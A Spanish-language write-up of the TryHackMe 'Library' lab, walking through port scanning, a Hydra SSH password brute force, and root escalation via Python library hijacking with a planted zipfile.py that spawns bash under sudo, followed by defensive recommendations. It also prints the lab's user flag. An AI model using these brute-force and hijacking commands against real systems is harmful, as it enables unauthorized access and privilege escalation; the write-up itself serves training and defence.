Informe Técnico — Library (TryHackMe)
Información General
Máquina: Library
Plataforma: TryHackMe
Objetivo: Obtener acceso inicial y privilegios root
Dirección IP: 10.128.153.216
Metodología: Reconocimiento → Enumeración → Explotación → Privilege Escalation
1. Reconocimiento

Se realizó un escaneo completo de puertos utilizando Nmap:

nmap -sC -sV -p- 10.128.153.216
Resultados
Puerto	Servicio	Versión
22	SSH	OpenSSH 7.2p2
80	HTTP	Apache 2.4.18

La aplicación web mostraba un blog accesible desde el puerto 80.

2. Enumeración Web

Se analizó el archivo robots.txt:

curl http://10.128.153.216/robots.txt
Resultado
User-agent: rockyou

Esto sugería el uso del diccionario rockyou.txt para ataques de fuerza bruta.

Posteriormente se ejecutó Gobuster:

gobuster dir -u http://10.128.153.216 -w /usr/share/wordlists/dirb/common.txt
Directorios encontrados
/images
/robots.txt

Durante la revisión manual del blog se identificó el usuario:

meliodas
3. Acceso Inicial

Se realizó un ataque de fuerza bruta contra SSH utilizando Hydra:

hydra -l meliodas -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.128.153.216

Una vez obtenidas las credenciales válidas, se accedió mediante SSH:

ssh meliodas@10.128.153.216
4. Obtención de User Flag

Dentro del sistema se localizaron los archivos del usuario:

ls
cat user.txt
User Flag
6d488cbb3f111d135722c33cb635f4ec
5. Enumeración Local

Se revisaron privilegios sudo:

sudo -l
Resultado
(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

El script bak.py importaba el módulo Python zipfile:

import zipfile
6. Privilege Escalation

Se aprovechó un ataque de secuestro de módulos Python (Python Library Hijacking).

Se creó un módulo malicioso llamado zipfile.py:

echo 'import os; os.system("/bin/bash")' > zipfile.py

Posteriormente se ejecutó el script permitido mediante sudo:

sudo /usr/bin/python /home/meliodas/bak.py

Python cargó el módulo malicioso local antes que el original, obteniendo así una shell con privilegios root.

7. Obtención de Root Flag

Una vez obtenidos privilegios root:

whoami
cat /root/root.txt
Root Flag
[PEGAR ROOT FLAG]
8. Vulnerabilidades Identificadas
Vulnerabilidad	Impacto
Uso de contraseñas débiles	Acceso inicial no autorizado
Exposición de pistas en robots.txt	Facilita ataques de fuerza bruta
Configuración sudo insegura	Escalada de privilegios
Python Library Hijacking	Ejecución de comandos como root
9. Recomendaciones
Implementar contraseñas robustas
Restringir intentos SSH
Eliminar información sensible en robots.txt
Evitar ejecutar scripts inseguros mediante sudo
Utilizar rutas absolutas para módulos Python
Aplicar principio de mínimo privilegio
Conclusión

La máquina fue comprometida exitosamente mediante:

enumeración web,
fuerza bruta SSH,
y escalada de privilegios mediante Python Library Hijacking.

El laboratorio permitió practicar técnicas reales utilizadas en entornos eJPT y pentesting Linux.
